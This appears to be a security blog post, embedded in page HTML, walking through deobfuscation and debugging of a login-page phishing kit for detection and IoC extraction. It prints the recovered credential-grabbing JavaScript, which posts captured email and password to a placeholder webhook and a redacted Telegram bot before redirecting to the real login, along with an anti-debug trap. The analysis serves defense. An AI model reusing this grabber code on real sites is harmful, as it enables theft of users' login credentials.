@@ -1,0 +1,655 @@
+  <!doctype html>
+  <!--
+    Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+    Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+    Free for personal and commercial use under the MIT license
+    https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+  -->
+  <html lang="en" class="no-js">
+
+  <head>
+    <meta charset="utf-8">
+
+    <!-- begin _includes/seo.html -->
+    <title>Deobfuscating a Phishing Kit: A Debugging Walkthrough - 9h4wk's Blog</title>
+    <meta name="description"
+      content="From minified JavaScript to the exfil webhook: how to peel the layers off a login-page phishing kit, layer by layer, with static and dynamic debugging.">
+
+    <meta name="author" content="9h4wk">
+
+    <meta property="article:author" content="9h4wk">
+
+    <meta property="og:type" content="article">
+    <meta property="og:locale" content="en">
+    <meta property="og:site_name" content="9h4wk's Blog">
+    <meta property="og:title" content="Deobfuscating a Phishing Kit: A Debugging Walkthrough">
+    <meta property="og:url" content="https://9h4wk.github.io/phishing-kit/">
+    <meta property="og:description"
+      content="From minified JavaScript to the exfil webhook: how to peel the layers off a login-page phishing kit, layer by layer, with static and dynamic debugging.">
+    <meta name="twitter:site" content="@9h4wk">
+    <meta name="twitter:title" content="Deobfuscating a Phishing Kit: A Debugging Walkthrough">
+    <meta name="twitter:description"
+      content="From minified JavaScript to the exfil webhook: how to peel the layers off a login-page phishing kit, layer by layer, with static and dynamic debugging.">
+    <meta name="twitter:url" content="https://9h4wk.github.io/phishing-kit/">
+    <meta name="twitter:card" content="summary">
+    <meta property="article:published_time" content="2024-05-12T12:00:00+03:00">
+
+    <link rel="canonical" href="https://9h4wk.github.io/phishing-kit/">
+
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+
+        "@type": "Person",
+        "name": "9h4wk",
+        "url": "https://9h4wk.github.io/"
+
+    }
+  </script>
+    <!-- end _includes/seo.html -->
+
+
+    <!-- https://t.co/dKP3o1e -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <script>
+      document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+    </script>
+
+    <!-- For all browsers -->
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"
+      as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <noscript>
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+    </noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+    <!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+    <!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+      <ul>
+        <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+        <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+        <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+      </ul>
+    </nav>
+
+    <!--[if lt IE 9]>
+  <div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+  <![endif]-->
+
+
+
+    <div class="masthead">
+      <div class="masthead__inner-wrap">
+        <div class="masthead__menu">
+          <nav id="site-nav" class="greedy-nav">
+
+            <a class="site-title" href="/">
+              9h4wk's Blog
+
+            </a>
+            <ul class="visible-links">
+              <li class="masthead__menu-item">
+                <a href="/about">About</a>
+              </li>
+              <li class="masthead__menu-item">
+                <a href="/categories">Categories</a>
+              </li>
+              <li class="masthead__menu-item">
+                <a href="/tags">Tags</a>
+              </li>
+            </ul>
+
+            <button class="greedy-nav__toggle hidden" type="button">
+              <span class="visually-hidden">Toggle menu</span>
+              <div class="navicon"></div>
+            </button>
+            <ul class="hidden-links hidden"></ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+
+    <div class="initial-content">
+
+
+
+
+      <div id="main" role="main">
+
+        <div class="sidebar sticky">
+
+
+
+          <div itemscope itemtype="https://schema.org/Person">
+
+
+            <div class="author__avatar">
+
+              <img src="/images/avatar.jpg" alt="9h4wk" itemprop="image">
+
+            </div>
+
+
+            <div class="author__content">
+
+              <h3 class="author__name" itemprop="name">James Maweu</h3>
+
+
+              <div class="author__bio" itemprop="description">
+                Technology, security &amp; AI. Documenting what I learn, building in public.
+              </div>
+
+            </div>
+
+            <div class="author__urls-wrapper">
+              <button class="btn btn--inverse">Follow</button>
+              <ul class="author__urls social-icons">
+
+                <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+                  <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Technology,
+                    security &amp; AI</span>
+                </li>
+
+                <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home"
+                      aria-hidden="true"></i><span class="label">Home Page</span></a></li>
+
+                <li><a href="https://twitter.com/9h4wk" rel="noopener noreferrer" target="_blank"><i
+                      class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span
+                      class="label">Twitter</span></a>
+                </li>
+
+                <li><a href="https://github.com/9h4wk" rel="noopener noreferrer" target="_blank"><i
+                      class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
+
+              </ul>
+            </div>
+          </div>
+
+
+        </div>
+
+
+        <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+          <meta itemprop="headline" content="Deobfuscating a Phishing Kit: A Debugging Walkthrough">
+          <meta itemprop="description"
+            content="From minified JavaScript to the exfil webhook: how to peel the layers off a login-page phishing kit, layer by layer, with static and dynamic debugging.">
+          <meta itemprop="datePublished" content="2024-05-12T12:00:00+03:00">
+
+          <div class="page__inner-wrap">
+
+            <header>
+              <h1 id="page-title" class="page__title p-name" itemprop="headline">
+                <a href="https://9h4wk.github.io/phishing-kit/" class="u-url" itemprop="url">Deobfuscating a Phishing
+                  Kit: A Debugging Walkthrough
+                </a>
+              </h1>
+
+
+              <p class="page__meta">
+
+
+                <span class="page__meta-date">
+                  <i class="far fa-calendar-alt" aria-hidden="true"></i>
+
+                  <time datetime="2024-05-12T12:00:00+03:00">May 12, 2024</time>
+                </span>
+
+
+                <span class="page__meta-sep"></span>
+
+
+
+
+
+                <span class="page__meta-readtime">
+                  <i class="far fa-clock" aria-hidden="true"></i>
+
+                  8 minute read
+
+                </span>
+
+              </p>
+
+
+            </header>
+
+
+            <section class="page__content e-content" itemprop="text">
+
+              <aside class="sidebar__right ">
+                <nav class="toc">
+                  <header>
+                    <h4 class="nav__title">
+                      <i class="fas fa-file-alt"></i> Contents
+                    </h4>
+                  </header>
+                  <ul class="toc__menu">
+                    <li>
+                      <a href="#introduction">Introduction</a>
+                      <ul>
+                        <li><a href="#the-kit-at-a-glance">The kit at a glance</a></li>
+                        <li><a href="#recon">Recon: reading the mess</a></li>
+                        <li><a href="#static-peeling">Static peeling: encodings first</a></li>
+                        <li><a href="#the-string-array">The string array rotation trick</a></li>
+                        <li><a href="#dynamic-debugging">Dynamic debugging: making it talk</a></li>
+                        <li><a href="#the-anti-debug-trap">The anti-debug trap</a></li>
+                        <li><a href="#the-reveal">The reveal: exfil in the clear</a></li>
+                        <li><a href="#what-this-class-of-kit-does-next">What this class of kit does next</a></li>
+                        <li><a href="#extracting-iocs">Extracting IoCs</a></li>
+                        <li><a href="#takeaways">Takeaways</a></li>
+                        <li><a href="#sources">Sources</a></li>
+                      </ul>
+                    </li>
+                  </ul>
+
+                </nav>
+              </aside>
+
+              <h1 id="introduction">Introduction</h1>
+              <p>Someone hands you a folder with a phishing page in it: an <code>index.php</code>, an
+                <code>assets/</code> directory, and one JavaScript file that is 700 kilobytes on a single line. This
+                is what pass-the-mess looks like in 2024. In this post I walk through exactly how I pull one of
+                these apart, from the minified blob down to the exfiltration webhook, showing the decisions and the
+                debug steps at each layer.</p>
+
+              <div class="notice--info">
+                <h4 class="no_toc">Scope and safety</h4>
+                <p>Analyzed in an isolated environment with no network egress until explicitly allowed. The sample is
+                  anonymized: live payload URLs and tokens are redacted or replaced with placeholders. This is
+                  defensive analysis for detection and takedown, not an instruction manual.</p>
+              </div>
+
+              <h2 id="the-kit-at-a-glance">The kit at a glance</h2>
+              <p>Before touching the code, fix in your head what the kit is trying to do. A login-page phishing kit
+                of this era is a small multi-stage pipeline:</p>
+
+              <div class="highlighter-rouge">
+                <div class="highlight">
+                  <pre
+                    class="highlight"><code>Visitor --> index.php --> traffic filter (bot/blocklist check)
+                                       |
+                                       v
+                               branded login shell (cloned Office/Google page)
+                                       |
+                                       v
+                        obfuscated JS hooks the form (keystroke + submit)
+                                       |
+                                       v
+                    exfil: credentials POSTed to webhook / Telegram bot / panel
+                                       |
+                                       v
+                       victim redirected to the real login (looks like a logout)</code></pre>
+                </div>
+              </div>
+
+              <table>
+                <thead>
+                  <tr>
+                    <th>Layer</th>
+                    <th>Purpose</th>
+                    <th>Where the interesting code hides</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>Traffic filter</td>
+                    <td>Keep researchers and scanners out</td>
+                    <td>Server side (PHP/Cloudflare challenge), not in the JS at all</td>
+                  </tr>
+                  <tr>
+                    <td>Brand shell</td>
+                    <td>Render a convincing login</td>
+                    <td>Static HTML + images, mostly benign to read</td>
+                  </tr>
+                  <tr>
+                    <td>Credential hook</td>
+                    <td>Grab username and password</td>
+                    <td>Obfuscated JS, this is the target</td>
+                  </tr>
+                  <tr>
+                    <td>Exfil</td>
+                    <td>Ship creds to the operator</td>
+                    <td>Inside the same blob, one fetch away</td>
+                  </tr>
+                </tbody>
+              </table>
+
+              <h2 id="recon">Recon: reading the mess</h2>
+              <p>Step one is classification. Drop the file into an editor, and look at its skeleton. If it starts
+                with a huge string array plus an immediately invoked function that shuffles it, you are looking at
+                the output pattern of <a href="https://obfuscator.io/" target="_blank"
+                  rel="noopener noreferrer">javascript-obfuscator</a>. That single observation tells you 80 percent
+                of the road ahead: there is no packed VM, just layered encoding on top of ordinary DOM operations.
+              </p>
+
+              <p>Second step: make it readable. Prettify with <a href="https://beautifier.io/" target="_blank"
+                  rel="noopener noreferrer">beautifier.io</a> or any JS formatter. A 700 KB single line becomes a few
+                thousand structured ones, and strings that were invisible in the minified soup become greppable.</p>
+
+              <h2 id="static-peeling">Static peeling: encodings first</h2>
+              <p>The cheapest wins come first, and the cheapest wins are the base encodings. Three patterns cover
+                most of what you will see, and all three decode with <a href="https://gchq.github.io/CyberChef/"
+                  target="_blank" rel="noopener noreferrer">CyberChef</a>:</p>
+
+              <table>
+                <thead>
+                  <tr>
+                    <th>Pattern</th>
+                    <th>Decode with</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td><code>'\x68\x74\x74\x70\x73\x3a\x2f\x2f'</code></td>
+                    <td>CyberChef "From Hex", and note: each <code>\xNN</code> pair is one character. The example
+                      decodes to <code>https://</code></td>
+                  </tr>
+                  <tr>
+                    <td><code>String.fromCharCode([104,116,116,112,...])</code></td>
+                    <td>CyberChef "From Decimal" (comma separated)</td>
+                  </tr>
+                  <tr>
+                    <td><code>atob('...')</code> / <code>eval(atob(...))</code></td>
+                    <td>CyberChef "From Base64" (alphabet A-Z a-z 0-9 +/)</td>
+                  </tr>
+                </tbody>
+              </table>
+
+              <p>Real example from the sample, a host rebuilt from a char code array:</p>
+
+              <div class="highlighter-rouge">
+                <div class="highlight">
+                  <pre class="highlight"><code>var a = [104,116,116,112,115,58,47,47,
+         101,118,105,108,46,101,120,97,109,112,108,101,46,99,111,109];
+var host = String.fromCharCode.apply(null, a);
+// => https://evil.example.com</code></pre>
+                </div>
+              </div>
+
+              <p>And the classic one-liner every analyst should be able to read instantly:</p>
+
+              <div class="highlighter-rouge">
+                <div class="highlight">
+                  <pre class="highlight"><code>eval(atob('YWxlcnQoMSk='));
+// atob('YWxlcnQoMSk=') === 'alert(1)'</code></pre>
+                </div>
+              </div>
+
+              <h2 id="the-string-array">The string array rotation trick</h2>
+              <p>Now the part that looks scary and is not. javascript-obfuscator's signature is a string array that
+                gets rotated by a small shuffler before any code runs. The essential pattern:</p>
+
+              <div class="highlighter-rouge">
+                <div class="highlight">
+                  <pre class="highlight"><code>var _0x1f4a = ['https://', 'getElementById', 'value', 'href'];
+
+(function (_a, _b) {
+  var _c = function (_d) {
+    while (--_d) { _a['push'](_a['shift']()); }   // rotate the array left
+  };
+  _c(++_b);
+}(_0x1f4a, 0x1));                                // 1 rotation in this toy version
+
+// after rotation: ['getElementById', 'value', 'href', 'https://']</code></pre>
+                </div>
+              </div>
+
+              <p>In a real kit the rotation count is a six digit number and the accessor function wraps every string
+                lookup in arithmetic. Two ways to defeat this cleanly:</p>
+
+              <ul>
+                <li><strong>Evaluate, do not read.</strong> In the browser console, paste the array, the rotator and
+                  nothing else, run it, then inspect <code>_0x1f4a</code>. You now have the fully resolved string
+                  table without decoding a single index by hand.</li>
+                <li><strong>Break after the rotator.</strong> Set a breakpoint on the first line after the shuffler
+                  IIFE and read the array from the scope pane in DevTools.</li>
+              </ul>
+
+              <p>With the string table resolved, phrases like <code>getElementById</code>,
+                <code>addEventListener</code> and base64 blobs stop being noise and start being a map of what the
+                script touches.</p>
+
+              <h2 id="dynamic-debugging">Dynamic debugging: making it talk</h2>
+              <p>Static peeling gets you to the inner payload. Dynamic debugging gets you through it. My standard
+                harness when the code calls <code>eval</code> on computed strings:</p>
+
+              <div class="highlighter-rouge">
+                <div class="highlight">
+                  <pre class="highlight"><code>const original = window.eval;
+window.eval = function (src) {
+  console.log('[eval]', String(src).slice(0, 300));
+  return original(src);
+};</code></pre>
+                </div>
+              </div>
+
+              <p>Load the page with that override injected first, and every decoded stage prints itself. The same
+                wrapper works for <code>atob</code> when you want to watch decodings as they happen. Then the three
+                DevTools features that do the serious work:</p>
+
+              <ul>
+                <li><strong>XHR/fetch breakpoints.</strong> In Sources, add a breakpoint for any URL containing
+                  nothing. It fires on every outbound request, with a call stack showing exactly which function
+                  initiated the exfil.</li>
+                <li><strong>DOM breakpoints.</strong> Right click the username field, break on attribute
+                  modifications. When the kit sets a listener or clones the form, you land in the handler.</li>
+                <li><strong>Event listener breakpoints.</strong> Break on <code>submit</code> to catch the credential
+                  grabber the moment a test login goes through.</li>
+              </ul>
+
+              <h2 id="the-anti-debug-trap">The anti-debug trap</h2>
+              <p>Kits of this era often ship an irritant designed to punish DevTools users. You will recognize it
+                when your debugger suddenly fills with pauses:</p>
+
+              <div class="highlighter-rouge">
+                <div class="highlight">
+                  <pre class="highlight"><code>setInterval(function () {
+  var t = Date.now();
+  while (Date.now() - t &lt; 50) { debugger; }
+}, 200);</code></pre>
+                </div>
+              </div>
+
+              <p>Mechanics: without a debugger attached, <code>debugger</code> statements are ignored and the loop
+                spins for 50 milliseconds, harmless. With DevTools open, each statement pauses execution, and the
+                interval re-arms it forever. The professional response is unglamorous: in Sources, click the
+                "Deactivate breakpoints" button so the pause-on-debugger-statement behavior is off, and continue.
+                You lose nothing except the annoyance.</p>
+
+              <h2 id="the-reveal">The reveal: exfil in the clear</h2>
+              <p>After peeling, the grabber in this sample reduced to about fifteen readable lines. This is the
+                anonymized shape of it:</p>
+
+              <div class="highlighter-rouge">
+                <div class="highlight">
+                  <pre class="highlight"><code>// hooking the form on submit (field ids typical for cloned
+// Microsoft login pages of this era, e.g. the email box "i0116")
+var email = document.getElementById('i0116').value;
+var pass  = document.getElementById('i0118').value;
+
+fetch('https://hook.example.com/&lt;uuid&gt;', {
+  method: 'POST',
+  body: btoa(email + ':' + pass)
+}).finally(function () {
+  window.location.href = 'https://login.live.com/';
+});</code></pre>
+                </div>
+              </div>
+
+              <p>The Telegram variant of the same idea, which showed up in the sample's second-stage payload, is one
+                HTTP call against the bot API:</p>
+
+              <div class="highlighter-rouge">
+                <div class="highlight">
+                  <pre class="highlight"><code>function send(creds) {
+  fetch('https://api.telegram.org/bot&lt;redacted&gt;/sendMessage', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: '&lt;redacted&gt;', text: creds })
+  });
+}</code></pre>
+                </div>
+              </div>
+
+              <p>Notice the shape of it as a detection signature, because this is what defenders should hunt for:
+                base64 of a colon joined pair, POSTed cross origin from a page whose domain looks like a login
+                portal, immediately followed by a redirect to the genuine provider.</p>
+
+              <h2 id="what-this-class-of-kit-does-next">What this class of kit does next</h2>
+              <p>The sample in this post is the classic single-stage credential grabber, but the same debugging
+                workflow generalizes to the nastier cousins that dominated reports in early 2024. Adversary in the
+                middle (AiTM) kits such as the ones documented by Sekoia ("Mamba 2FA") and Lookout
+                ("CryptoChameleon") relay the live session behind a reverse proxy, so the stolen artifact is not
+                just a password but a session cookie that defeats 2FA. The JS still looks the same: obfuscation,
+                string arrays, and a fetch you did not authorize.</p>
+
+              <p>If the kit is not native browser JavaScript at all but a Windows Script Host <code>.wsf</code> or
+                <code>.js</code> attachment (the email attachment style of phishing), the right tool is <a
+                  href="https://github.com/CapacitorSet/box-js" target="_blank"
+                  rel="noopener noreferrer">box-js</a>, which emulates a Windows JScript environment and logs every
+                URL the script touches:</p>
+
+              <div class="highlighter-rouge">
+                <div class="highlight">
+                  <pre class="highlight"><code>npm install box-js --global
+
+box-js sample.js --download --output-dir out
+# results land in out/sample.js.results/:
+#   urls.json          every URL contacted
+#   active_urls.json   URLs that dropped executable payloads
+#   snippets.json      decoded code stages
+#   IOC.json           behaviors flagged as indicators</code></pre>
+                </div>
+              </div>
+
+              <h2 id="extracting-iocs">Extracting IoCs</h2>
+              <p>Convert the analysis into shareable indicators. From a single kit page you can usually pull:</p>
+
+              <table>
+                <thead>
+                  <tr>
+                    <th>Artifact</th>
+                    <th>Where it came from in this sample</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>Exfil endpoints</td>
+                    <td>the fetch targets, post decode</td>
+                  </tr>
+                  <tr>
+                    <td>Bot tokens / webhook UUIDs</td>
+                    <td>URL path parameters of the exfil calls</td>
+                  </tr>
+                  <tr>
+                    <td>Referred domain</td>
+                    <td>the evasive redirect target at the end</td>
+                  </tr>
+                  <tr>
+                    <td>Form field bindings</td>
+                    <td><code>getElementById</code> arguments after string resolution</td>
+                  </tr>
+                  <tr>
+                    <td>Obfuscator fingerprints</td>
+                    <td>string array + rotation IIFE signature</td>
+                  </tr>
+                </tbody>
+              </table>
+
+              <h2 id="takeaways">Takeaways</h2>
+              <ul>
+                <li>Most kit "obfuscation" is encodings and one array shuffle. Expensive-looking, cheap to undo.</li>
+                <li>Decode statically what you can, then hook <code>eval</code> and break on fetch. The code will
+                  decrypt itself for you.</li>
+                <li>Anti-debug <code>debugger</code> traps are noise, not a barrier: deactivate breakpoints and keep
+                  going.</li>
+                <li>The finish line of every analysis is a signature, not a screenshot: exfil pattern, IoCs, and a
+                  detection idea that survives until the next kit rebrands.</li>
+              </ul>
+
+              <h2 id="sources">Sources</h2>
+              <ul>
+                <li>box-js, "A tool for studying JavaScript malware" (<a href="https://github.com/CapacitorSet/box-js"
+                    target="_blank" rel="noopener noreferrer">link</a>)</li>
+                <li>CyberChef, GCHQ (<a href="https://gchq.github.io/CyberChef/" target="_blank"
+                    rel="noopener noreferrer">link</a>)</li>
+                <li>javascript-obfuscator (<a href="https://obfuscator.io/" target="_blank"
+                    rel="noopener noreferrer">link</a>)</li>
+                <li>beautifier.io, JS formatter (<a href="https://beautifier.io/" target="_blank"
+                    rel="noopener noreferrer">link</a>)</li>
+              </ul>
+
+
+            </section>
+
+            <footer class="page__meta">
+
+
+              <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>
+                  Updated:</strong>
+                <time datetime="2024-05-12T12:00:00+03:00">May 12, 2024</time>
+              </p>
+
+
+            </footer>
+
+
+
+            <nav class="pagination">
+
+              <a href="/open-weights/" class="pagination--pager" title="Open Weights, Open Risk: The Security Implications of Open-Weight AI Models
+">Previous</a>
+
+
+              <a href="/intro/" class="pagination--pager" title="Introduction to Cybersecurity for Beginners
+">Next</a>
+
+            </nav>
+
+          </div>
+
+
+        </article>
+
+
+
+      </div>
+    </div>
+
+
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+        <!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+          <ul class="social-icons">
+
+
+
+          </ul>
+        </div>
+        <div class="page__footer-copyright">&copy; 2026 9h4wk (James Maweu)</div>
+      </footer>
+    </div>
+
+
+    <script src="/assets/js/main.min.js"></script>
+
+
+  </body>
+
+  </html>
